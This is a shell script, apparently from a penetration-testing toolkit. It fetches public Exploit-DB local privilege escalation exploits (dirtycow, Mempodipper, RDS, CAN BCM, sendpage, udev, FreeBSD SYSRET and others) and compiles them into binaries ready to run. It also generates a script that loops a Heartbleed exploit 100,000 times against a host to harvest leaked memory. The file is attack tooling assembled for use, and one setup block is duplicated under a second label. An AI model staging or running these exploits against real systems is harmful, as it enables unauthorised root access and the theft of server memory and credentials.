mkdir -p public/exploits_linux_prevesc/bsd
cd public/exploits_linux_prevesc/bsd

    if [ ! -f freebsd-9.0-9.1-mmap_ptrace-86 ]; then
        banner "exploits_linux_prevesc/bsd - freebsd-9.0-9.1-mmap_ptrace - https://www.exploit-db.com/exploits/26368"
        searchsploit -m 26368 
        mv 26368.c freebsd-9.0-9.1-mmap_ptrace.c
        # gcc -Wall -m32 -Wl,--hash-style=both -o freebsd-9.0-9.1-mmap_ptrace-86 freebsd-9.0-9.1-mmap_ptrace.c
        # gcc -Wall -m64 -Wl,--hash-style=both -o freebsd-9.0-9.1-mmap_ptrace-64 freebsd-9.0-9.1-mmap_ptrace.c
    fi

    if [ ! -f freebsd-9.0-SYSRET-86 ]; then
        banner "exploits_linux_prevesc/bsd - freebsd-9.0-SYSRET - https://www.exploit-db.com/exploits/28718"
        searchsploit -m 28718
        mv 28718.c freebsd-9.0-SYSRET.c
        # gcc -Wall -m32 -Wl,--hash-style=both -o freebsd-9.0-SYSRET-86 freebsd-9.0-SYSRET.c
        # gcc -Wall -m64 -Wl,--hash-style=both -o freebsd-9.0-SYSRET-64 freebsd-9.0-SYSRET.c
    fi        

cd -

cd public/exploits_linux_prevesc

    if [ ! -f linux-sendpage-86 ]; then
        banner "exploits_linux_prevesc/2.4.x - linux-sendpage - https://www.exploit-db.com/exploits/9545"
        searchsploit -m 9545
        mv 9545.c linux-sendpage.c
        gcc -Wall -m32 -Wl,--hash-style=both -o linux-sendpage-86 linux-sendpage.c
        gcc -Wall -m64 -Wl,--hash-style=both -o linux-sendpage-64 linux-sendpage.c
    fi 

    if [ ! -f linux-sendpage-86 ]; then
        banner "exploits_linux_prevesc/2.6.x - linux-sendpage - https://www.exploit-db.com/exploits/9545"
        searchsploit -m 9545
        mv 9545.c linux-sendpage.c
        gcc -Wall -m32 -Wl,--hash-style=both -o linux-sendpage-86 linux-sendpage.c
        gcc -Wall -m64 -Wl,--hash-style=both -o linux-sendpage-64 linux-sendpage.c
    fi

    if [ ! -f udev.sh ]; then
        banner "exploits_linux_prevesc/2.6.x - udev.sh - https://www.exploit-db.com/exploits/8478"
        searchsploit -m 8478
        mv 8478.sh udev.sh
    fi

    if [ ! -f ReiserFS-xattr.py ]; then
        banner "exploits_linux_prevesc/2.6.x - ReiserFS-xattr - https://www.exploit-db.com/exploits/12130"
        searchsploit -m 12130
        mv 12130.py ReiserFS-xattr.py
    fi

    if [ ! -f i-can-haz-modharden ]; then
        banner "exploits_linux_prevesc/2.6.x - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation - https://www.exploit-db.com/exploits/14814"
        searchsploit -m 14814
        mv 14814.c i-can-haz-modharden.c 
        gcc -Wall -m32 -Wl,--hash-style=both -o i-can-haz-modharden-86 i-can-haz-modharden.c 
        gcc -Wall -m64 -Wl,--hash-style=both -o i-can-haz-modharden-64 i-can-haz-modharden.c 
    fi

    if [ ! -f rds ]; then
        banner "exploits_linux_prevesc - Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation - https://www.exploit-db.com/exploits/15285"
        searchsploit -m 15285
        mv 15285.c rds.c
        gcc -Wall -m32 -Wl,--hash-style=both -o rds-86 rds.c  
        gcc -Wall -m64 -Wl,--hash-style=both -o rds-64 rds.c  
    fi

    if [ ! -f 2.6.39-3.2.2-Mempodipper_1-86 ]; then
        banner "exploits_linux_prevesc - 2.6.39-3.2.2-Mempodipper_1 - https://www.exploit-db.com/exploits/35161"
        searchsploit -m 35161
        mv 35161.c 2.6.39-3.2.2-Mempodipper_1.c
        gcc -Wall -m32 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_1-86 2.6.39-3.2.2-Mempodipper_1.c 
        gcc -Wall -m64 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_1-64 2.6.39-3.2.2-Mempodipper_1.c 
    fi

    if [ ! -f 2.6.39-3.2.2-Mempodipper_2-86 ]; then
        banner "exploits_linux_prevesc - 2.6.39-3.2.2-Mempodipper_2 - https://www.exploit-db.com/exploits/18411"
        searchsploit -m 18411
        mv 18411.c 2.6.39-3.2.2-Mempodipper_2.c
        gcc -Wall -m32 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_2-86 2.6.39-3.2.2-Mempodipper_2.c 
        gcc -Wall -m64 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_2-64 2.6.39-3.2.2-Mempodipper_2.c
    fi 

    if [ ! -f dirtycow ]; then
        banner "exploits_linux_prevesc - dirtycow - https://www.exploit-db.com/exploits/40839"
        searchsploit -m 40839
        mv 40839.c dirtycow.c
        gcc -pthread dirtycow.c -o dirtycow -lcrypt
    fi

cd -

mkdir -p public/exploits_linux_prevesc/davfs2
cd public/exploits_linux_prevesc/davfs2

    if [ ! -f coda.c ]; then
        banner "exploits_linux_prevesc/davfs2 - https://www.exploit-db.com/exploits/28806"
        searchsploit -m 28806
        sed -n '44,76p' 28806.txt > coda.c
        sed -n '84,92p' 28806.txt > Makefile
        sed -n '101,192p' 28806.txt > exploit.sh
        mv 28806.txt old_28806.txt
    fi

cd -

mkdir -p public/exploits_linux_prevesc/openssl
cd public/exploits_linux_prevesc/openssl
    
    if [ ! -f heartbleed.sh ]; then
        banner "exploits_linux_prevesc/openssl - heartbleed - https://www.exploit-db.com/exploits/32745"
        echo "[*] Installing: fdupes"
        apt install fdupes
        searchsploit -m 32745
        mv 32745.py heartbleed.py

cat <<\EOT >heartbleed.sh
    #! /bin/bash
    for i in $(seq 1 100000); do python heartbleed.py 10.10.10.10 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done
    fdupes -rf data_dump | grep -v '^$' > data_dumps
    xargs -a data_dumps rm -v
EOT

    fi

cd -
